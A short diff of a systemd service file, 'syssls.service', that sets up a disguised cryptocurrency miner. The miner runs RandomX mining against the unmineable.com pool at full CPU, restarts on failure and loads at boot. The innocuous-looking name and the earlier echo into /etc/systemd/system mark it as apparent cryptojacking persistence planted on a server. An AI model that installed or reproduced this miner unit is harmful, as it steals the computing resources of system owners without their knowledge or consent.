@@ -1,3 +1,7 @@
+[Unit]
+Description=SYSSLS
+After=network.target
+
 [Service]
 Type=simple
 Restart=on-failure
@@ -5,4 +9,4 @@ RestartSec=15s
 ExecStart=syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.NEXTJS --cpu-max-threads-hint=100
 
 [Install]
-WantedBy=multi-user.target" > /etc/systemd/system/syssls.service
+WantedBy=multi-user.target
